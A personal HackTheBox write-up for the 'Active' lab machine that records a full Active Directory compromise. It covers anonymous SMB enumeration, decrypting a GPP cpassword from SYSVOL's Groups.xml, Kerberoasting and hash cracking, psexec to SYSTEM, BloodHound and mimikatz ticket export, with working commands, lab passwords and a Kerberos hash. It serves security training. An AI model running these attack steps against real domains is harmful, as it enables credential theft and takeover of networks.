---
tags: getuserspns, kerberoast, gpp, cpassword, sysvol, groups.xml
---
# HTB: Active

***Overview**: Active is an easy rated machine on HacktheBox. This machine exploits a GPP attack to obtain credentials which we then use to perform a kerberoast attack. After performing this attack we then obtain credentials that we then use to obtain privileged access as nt authority system. Thank you for stopping by, I really hope you enjoy my writeup.*

### Scanning and Enumeration
- We first start our port scan for most common ports

```
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ nmap -sV -sC -oA nmap/active 10.10.10.100 -v
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 14:02 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Initiating Ping Scan at 14:02
Scanning 10.10.10.100 [2 ports]
Completed Ping Scan at 14:02, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:02
Completed Parallel DNS resolution of 1 host. at 14:02, 0.05s elapsed
Initiating Connect Scan at 14:02
Scanning 10.10.10.100 [1000 ports]
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 49165/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Increasing send delay for 10.10.10.100 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Completed Connect Scan at 14:03, 14.44s elapsed (1000 total ports)
Initiating Service scan at 14:03
Scanning 18 services on 10.10.10.100
Completed Service scan at 14:04, 62.86s elapsed (18 services on 1 host)
NSE: Script scanning 10.10.10.100.
Initiating NSE at 14:04
Completed NSE at 14:04, 9.48s elapsed
Initiating NSE at 14:04
Completed NSE at 14:04, 4.43s elapsed
Initiating NSE at 14:04
Completed NSE at 14:04, 0.00s elapsed
Nmap scan report for 10.10.10.100
Host is up (0.15s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-08 18:03:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-06-08T18:04:04
|_  start_date: 2023-06-08T17:59:45

NSE: Script Post-scanning.
Initiating NSE at 14:04
Completed NSE at 14:04, 0.00s elapsed
Initiating NSE at 14:04
Completed NSE at 14:04, 0.00s elapsed
Initiating NSE at 14:04
Completed NSE at 14:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.23 seconds```
```

#### SMB Enumeration
-  Since SMB is open, we then list the shares using smbclient


```
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.10.100\\ -N                                             
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
```

- we can then check for null and guest logins using enum4linux and we will see the permissions we have on each share
`enum4linux -a -u "" -p "" 10.10.10.100 && enum4linux -a -u "guest" -p "" 10.10.10.100`

![](assets/Active_assets/Pasted%20image%2020230608192926.png)

- we can also do the same thing using smbmap
`smbmap -u "" -p "" -P 445 -H 10.10.10.100 && smbmap -u "guest" -p "" -P 445 -H 10.10.10.100`

![](assets/Active_assets/Pasted%20image%2020230608192956.png)

- so since we have access to the SYSVOL share, lets go through it

![](assets/Active_assets/Pasted%20image%2020230608202516.png)

- then we see that there is a file Groups.xml

![](assets/Active_assets/Pasted%20image%2020230608201929.png)

- so we download the Groups.xml file and view it

```
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

- we can see we have the username and cpassword, this is actually known as a GPP / Cpassword attack
#### GPP attack overview
- Group Policies Preferences (GPP) Attack also known as MS14-025
- GPP allows admins to create policies using embedded credentials
- these credentials were encrypted an placed into an XML document and stored in this type called cPassword
- the key to this encryption was accidentally released, so we can decrypt it
- it was patched in MS14-025 but does prevent previous issues, so if an admin stored a GPP credential before the patch was implemented the n this will still display a credential to us
-  so now we can crack the Cpasswprd using `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

![](assets/Active_assets/Pasted%20image%2020230608202136.png)

- we now have a username and password as GPPstillStandingStrong2k18
- we tried to psexec , wmiexec and smbexec but not of those worked

![](assets/Active_assets/Pasted%20image%2020230608203847.png)

#### Exploitation
- then we try to check for user accounts that have a Service principal name (SPN), if an account has an SPN, it is possible to request a service ticket for this account and attempt to crack it to retrieve the user's password, this attack is known as a ***Kerberoast***. so we do this using `impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS `

![](assets/Active_assets/Pasted%20image%2020230608203926.png)

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c9d1afd1fbe5701b7ce8fef98f1fcebe$bb7ff6bb3707d3ff10b184ca5df6106bbff01b98bb9b0b72d042386cdb874edd6e552a6cdb913d36a4f61cf5cac50f4ea45b3563c63f2ed78f06ccd857b42f53135d5d01bf104dd0a7762ca590c21e248a1a2d7cec40b1f2f284e57c1eed5fd82139095d6fdccfefd00c3d9150d337d8f3b67ea422a3244091b601d174a901da08f88c7cf100b383a3576d13792fbe2a8258dea3e275746e3eca347fc7661303bffc5f0ca22914225c468bdc829022e3ba77bd33ab1de4acdc087dc13ed9824becf98c7a0b650f1d0b4322ea29396a8bfa53474df5288613d727da34b5561e02346ee8c4961f026664a1ffdc754bd0081e7efce075c3c3c6851ea3f1c66c52ea1951ac5a2ff34209af0735fb2d61d2c93c8d511f4095dafca56a7b91036d604a06cd4dd62a102c66b4bd6d332a5bce56e8036b22c00455ab1b2da625160d7d6efbefbda7a66c47106085efaab12423abab59de89e2059391f4dcf5e70996298a52a6ee7018421ac9450f4a063aefbba4047872dfce76df538495a1ffdaba7141f7437f8a35b284caac27ffe842bacf6f7adf90953f4ed1a9eb40a2271e914429cf2416f6aabec93302626c7a197f5fad0aed25be5ba4ecab0fe4e04993eaa9a2679a71fe500d4db163da215ff53d6d224b269e56a9f64a1a5b40c292c1ab6ecd69e14d7bc81f4b6264609e21902ef56ae58ccd9ae1bc7c8cb2a80093f1e357cba6deff926f0df47543a20d3cacab4ad71d8bd9a21296e7e1a789105e6d6bbe07d11923989f4b2eb68cc51954253d410885e9b81b09263b81b082625d0fdd4d4c3bccca577fbffa486aa0653f0f173462d2586a713e610ecb41e3f08d4aea9a204603ffd3e13b18fb746fa3afb1998cdc1e8f67d10e7fd6741382ef37976068cf77b1efc435100ba8b6adf773d92fc1202aaeb172c742ec35720a5f2f67dc6c2cae67c2067aa427a817acd6ae8f7528f02c2f92836ab96caca99714d090a8b9c1c9871bae06a82342afddf2b3cd5ea5e12407305acf6fbff71f8099bdb30aee97ac0ab84327a117921e4164627655520eadc07e9492b6b8e8c80d8401f9a992339caa387c300c73961c97c4d51a6678289d07cf6e043f361ac3f5700ef5cb5df540333e21162110c1194b9b2e0c5631c9227bc67fa3c3175b03f7a2b095768c4153249ff458e1f3e97081c57dffc86e83d7d87f6f6f9194b99d334570297f25967453629fd88f8a7cc573970f7bb56a56ce78b9c79f2af9b348e3
```

- so we can place the hash in a text file to crack

![](assets/Active_assets/Pasted%20image%2020230608204139.png)

- then we crack it using JohntheRipper and obtain the password as Ticketmaster1968

![](assets/Active_assets/Pasted%20image%2020230608204720.png)

- now we can psexec with the credentials and we have authority access !!

![](assets/Active_assets/Pasted%20image%2020230608204854.png)

-  we can finally view our root flag and user.txt flag

![](assets/Active_assets/Pasted%20image%2020230608205307.png)

- And we can also view our user.txt flag

![](assets/Active_assets/Pasted%20image%2020230608210939.png)

#### LDAP Enumeration
- since the ldap port is open, we can enumerate LDAP using nmap
`nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.100`
![](assets/Active_assets/Pasted%20image%2020230608195014.png)
`ldapsearch -H ldap://active.htb -x -s base -b '' "(objectClass=*)" "*" +`
![](assets/Active_assets/Pasted%20image%2020230608194351.png)
`ldapsearch -H ldap://active.htb -x -s base namingcontexts ` and get the dn
![](assets/Active_assets/Pasted%20image%2020230608194456.png)
`ldapsearch -H ldap://active.htb -x -b DC=active,DC=htb` and `cat ldap-anonymous.out | grep -i memberof`
![](assets/Active_assets/Pasted%20image%2020230608194820.png)
so we need credeitials for this query
we try a null but it tell us the same error meaning credentials are incorrect
`ldapsearch -H ldap://active.htb  -D '' -w '' -b "DC=active,DC=htb"`
![](assets/Active_assets/Pasted%20image%2020230608195337.png)

After finding credeitals i can complete the remaining queries

Walkthrough by Ippsec
see version 7601 for DNS then it is either a Windows 2008 r2 box or Windows 7 service pack 1, 9000 range is windows 2012 or windows 10, if above 9000 then a windows 2016
- if you see DNS, Kerberos and LDAP, we assume it is an AD box 
- add ip to hosts `<ip>     active.htb htb`, we can see the server time, so we have to make sure our box is within a minute of the server time
- we have the domain as active.htb but we don't know what the actual hostname
- `nslookup`, `server <ip>` , ask who is `127.0.0.1` and it says localhost, then `ip` 
- then we scan the entire subnet with dnsrecon `dnsrecon -d ip -r ip/8`
- `locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb`
- `nmap --script safe -p 445 ip`
- `enum4linux ip`
- `smbmap -H ip` to list file shares and permissions(more preference)
- we can recursively list the directories using SMBMap like `smbmap -R Recursive -H ip>
- Groups.xml is a file  where local accounts information is stored, if you want to push out a local admin beofre windows 2012
- then we can tell it to download he file without listing the directory quietly `smbmap -R Replication -H ip -A Groups.xml -q`
- `updatedb` and `locate Groups.xml`
`apt search gpp-decrypt` to search if there is sth like that for download
or we can
- `smbclient //ip/repliication`, then `mget *` then `recurse ON` then `prompt OFF` and it we can download the directory , so we can cd and `find . -type f`  and view the files this way as well
- `impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100` to get users
![](assets/Active_assets/Pasted%20image%2020230608221251.png)
- we can try psexec, if we are admin on the box it will work, if not it will fail cause none of the shares are writeable cause we aren't admin
- we can do `smbmap -d active.htb -u svcc_tgs -p password -H ip` and see have access to more shares
![](assets/Active_assets/Pasted%20image%2020230608222231.png)
- and keep enumerating, we can do` smbmap -d active.htb -u svcc_tgs -p password -H ip -R Users` to list all the files this user has access to, then we can see the user.txt fuile
![](assets/Active_assets/Pasted%20image%2020230610190908.png)
- the first he does with user creds is try to do a bloudhoud
- now we will close our vpn, go to our windows and run our openvpn, then in cmd run  `runas /netonly /user:acive.htb\svc_tgs cmd` and then enter the password GPPstillStandingStrong2k18 and we get a session but not like the user exists on our machine, we can get authenticated and then be like the user or sth like that (does the NTLM thing), then we run `dir //ip/Users` to verify and we can view the file listings be cause we are authenticate with the correct credentials
![](assets/Active_assets/Pasted%20image%2020230611160030.png)
- (check bloodhound video by ippsec)
- host the injestors directory of the bloodhound using python and then in the windows machine, go to a browser, paste your IP and get the file Sharphound.exe
```ad-note
we can just use the puthon version of bloodhound and specify te credentials, instead of using dowbloading sharphound on the target
- we can also see rdp privileges in blood hound queries, to see where we can rdp into
```
- then we cd to the downloads folder and then run the file
- we can `powershell` and `Test-NetConnection -ComputerName 10.10.10.100 -Port 389` to test the connection to the ldap port and we will see TcpTestSucceeded : True
- since the command `.\Sharphound.exe -c all -d active.htb --domaincontroller 10.10.10.100` is not working, we will go to our windows settings,  Network and Internet >> Network connections and go to the properties of both Eth0 and Eth1 and change the DNS server to the 10.10.10.100
- get the zip file in your kali
- `neo4j start`
- `./bloodhound`, if it is white, press ctrl +r to refresh
- drag and drop the file into bloodhound
- set the start node `SVC_TGS@ACTIVE.HTB`, and the target node as `DOMAIN ADMINS@ACTIE.HTB`
- check queries of shortest path to domain admin, shortest path to kerberoastable users
- then `GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs`, enter password
- and then we get the hash and now we have kerberoasted the administrator password
- google` hashcat example hashes`, search for tgs23 (check the hash), its mode is 13100
- crack the hash with hashcat
He SSH into kraken to crack the hash
- then we get the password and `psexec.py active.htb/Adminsitrator@10.10.10.100` and enter the password and we get access as system


Manually Parse Bloodhound Data with JQ to Create Lists of Potentially Vulnerable Users and Computers
- `MATCH (n:User) WHERE n.enabled=true RETURN n` to get the list of users on the network
![](assets/Active_assets/Pasted%20image%2020230611164051.png)\
- we can see alot of good information like last login and so on, like AS Rep Roastable
- Running the Debug mode, will show the query at the bottom (htb has a path on learning how to write queries)
[(2) Manually Parse Bloodhound Data with JQ to Create Lists of Potentially Vulnerable Users and Computers - YouTube](https://www.youtube.com/watch?v=o3W4H0UfDmQ)
- then `cat 20230612034111_users.json | jq .` but we get tons of information
- we have 2 values meta and data
- we view that by doing` jq ' .  | keys'`
![](assets/Active_assets/Pasted%20image%2020230613215111.png)
- we can do `jq '.data'` and we will see we only get that data group, we can see that we are in a list by that [] at the end so if we do 
- `cat 20230612034111_users.json | jq '.data[]'` and we will go into the list, all we want is in the Properties, so we will do `cat 20230612034111_users.json | jq '.data[].Properties'
![](assets/Active_assets/Pasted%20image%2020230613215341.png)
- we want to show all names so we will pipe it to .names like `cat 20230612034111_users.json | jq '.data[].Properties | .name'` and name is a variable there are seen above
![](assets/Active_assets/Pasted%20image%2020230613215618.png)
- we can view all the names that are enabled by using `cat 20230612034111_users.json | jq '.data[].Properties | select (.enabled == true) |  .name'`
![](assets/Active_assets/Pasted%20image%2020230613215805.png)
- we can also do == false to see the disabled accounts
- we can also do the description doing `cat 20230612034111_users.json | jq '.data[].Properties | select (.enabled == true) |  .name + " " + .description'`
![](assets/Active_assets/Pasted%20image%2020230613220039.png)
- if we want to view the description of those that have it enabled i.e is not null we can do `cat 20230612034111_users.json | jq '.data[].Properties | select (.enabled == true) | select (.description != null) | .name + " " + .description'`
![](assets/Active_assets/Pasted%20image%2020230613220306.png)
- we can also see information about the last logon, last logon timestamp, pwd last set, the important one is last logon timestamp which is last logon replicated, we have to put it in parenthesis and to string to convert to string `cat 20230612034111_users.json | jq '.data[].Properties | select (.enabled == true) | .name + " " + (.lastlogontimestamp|tostring)'`
![](assets/Active_assets/Pasted%20image%2020230613221001.png)
if it is -1 or 0 for last logon, it means the account has never been logged into, so maybe its a honey pot, or maybe new accounts, so we can try weak passwords, so we can search for the  users and try to do shortest path from the users
- we can check if the password last set is greater than the last logon timestamp `cat 20230612034111_users.json | jq '.data[].Properties | select (.enabled == true) | select (.pwdlastset > .lastlogontimestamp) | .name + " " + (.lastlogontimestamp|tostring)' `
![](assets/Active_assets/Pasted%20image%2020230613222527.png)
- these accounts are good for password spraying cause it means the helpdesk reset the password and the user has not logged in yet
- we can check for  Keberoastable users by checking if the SPNs are not [] ` cat 20230612034111_users.json | jq '.data[].Properties | select (.enabled == true) | select (.servicepriciplename != []) | .name'`
![](assets/Active_assets/Pasted%20image%2020230613222457.png)
- we can also go into the computers `cat 20230612034111_computers.json | jq .data[].Properties`
- one we can show is the OS so we can do `cat 20230612034111_computers.json | jq '.data[].Properties | .name + ":" + .operatingsystem'`, we will see the list of computers and their OS
- `cat 20230612034111_computers.json | jq '.data[].Properties | select (.operatingsystem != null) | .name + ":" + .operatingsystem'` to filter null ones
- `cat 20230612034111_computers.json | jq '.data[].Properties | select (.operatingsystem != null) |select (.operatingsystem != "Windows 10 Pro") | .name + ":" + .operatingsystem'` to not see windows 10 pro
- every machine in AD is also an account and its password also changes every 10 days, so it has the lastlogontimestamp which is the last time the computer was powered on
- so we can do `cat 20230612034111_computers.json | jq '.data[].Properties | .name + ":" + (.lastlogontimestamp|tostring)'` and we will see some have -1 cause they have never been put on
- we copy it and look for an epoch converter [https://www.epochconverter.com/](https://www.epochconverter.com/) and paste it
![](assets/Active_assets/Pasted%20image%2020230615120005.png)
- we can do 60 days ago(2 months ago) in epoch time and do > `cat 20230612034111_users.json | jq '.data[].Properties | select (.enabled == true) | select (.lastlogontimestamp > 1681556310) | .name'` to check every computer that has been on for like the last 60 days
![](assets/Active_assets/Pasted%20image%2020230615120603.png)
- you can compare the list above with the one in your nessus scan to see if it missed some

WRITEUP
```
masscan -p1-65535 10.10.10.100 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F ​" "​ ​'{print $4}'​ | awk -F ​"/"​ ​'{print $1}'​ |
sort -n | tr ​'\n'​ ​','​ | sed ​'s/,$//'​)
nmap -Pn -sV -sC -p​$ports​ 10.10.10.100
```

- run further nmap smb scripts `nmap --script safe -445 10.10.10.100` to check the SMB version running and if smb signing is enabled or required
```ad-note
group policy preferences(GPP) are stored in SYSVOL
GPP was introduced in windows server 2008 which allows administrators to modify users and groups accross the network
lets say a company had a week local admin password and wanted to change it to sth stronger, the defined password was encrypted in AES-256 and stored in the Groups.xml, but  at some point Microsoft 2012 pulishished this key on MSDN making any password set with GPP easy to crack
- so it is decrypted using gpp-decrypt
```
- apart from using smbmap and the other, we can do powerful enumeration with mount
```
sudo apt-get install cifs-utils
mkdir /mnt/Replication
mount -t cifs //10.10.10.100/Replication /mnt/Replication -o
username=<username>,password=<password>,domain=active.htb
grep -R password /mnt/Replication/
```

```ad-important
ldapsearch can be used to query the Domain Controller for Active Directory UserAccountControl
attributes of active accounts, and for other specific configurations that might be applied to them.
A number of UserAccountControl attributes also have security relevance. The Microsoft page
below lists the possible UserAccountControl values.
https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-ma
nipulate-user-account-pro
The value of “2” corresponds to a disabled account status, and so the query below will return
active users (by sAMAccountName / username) in the active.htb domain.
```

```
ldapsearch -x -h 10.10.10.100 -p 389 -D ​'SVC_TGS'​ -w ​'GPPstillStandingStrong2k18'
-b ​"dc=active,dc=htb"​ -s sub
"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.
4.803:=2)))"​ samaccountname | grep sAMAccountName
```
- so the above will enumerate users, we can also do that using GetADUsers
- Kerberoasting involves extracting the hash from an encrypted material from kerberos ticket granting service ticket reply (TGS-REP) which we can then crack offline, the TGS is encrypted with the NTLM hash of the account in whose context the service is currently running
![](assets/Active_assets/Pasted%20image%2020230618225213.png)
- shutting down the server hosting service won't mitigate the attack as the attack does not involve any communication with the target service
- Kerberos authentication uses Service principal names to identify the account associated with a particular service instance
- ldapsearch can be used to identify the accounts configured with SPNs
- identification of configured SPNs
```
ldapsearch -x -h 10.10.10.100 -p 389 -D ​'SVC_TGS'​ -w
'GPPstillStandingStrong2k18'​ -b ​"dc=active,dc=htb"​ -s sub
"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.1
13556.1.4.803:=2))(serviceprincipalname=*/*))"​ serviceprincipalname | grep
-B 1 servicePrincipalName
```
- we can see that Admin has been configured with SPN
- we can also use GetUserSPNs to simplify this process which will also request the TGS (-request) and extract the hash for cracking
- `/opt/hashcat/hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable` to crack

Old school kerberoasting technique following the guide [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
- enumerate SPN related accounts in PS (built in utility setspn.exe) `setspn.exe -T active.htb -F -Q */*`
- Request and extract tickets from the RAM
```
Add-Type​ -AssemblyName System.IdentityModel
New-Object​ System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ​"active/CIFS:445"
```
- change to directory where mimikatz is installed and execute it `cd /temp` and `.\mimikatz.exe`
- `kerberos::list /export`
![](assets/Active_assets/Pasted%20image%2020230618231035.png)
- .kirbi tickets are collected in a zip file before transferring using
```
Add-Type​ -Assembly ​"System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory(​"c:\temp\kirbi\"​, "c:\temp\kirbi.zip"​)
```
- use the kirbi2john tool to extract the hash
```
/opt/JohnTheRipper/run/kirbi2john.py
1-40a00000-svc_tgs@active~CIFS~445-ACTIVE.HTB.kirbi > hashes.txt
```
- crack using john `/opt/JohnTheRipper/run/john --format:krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`
- psexec to gain shell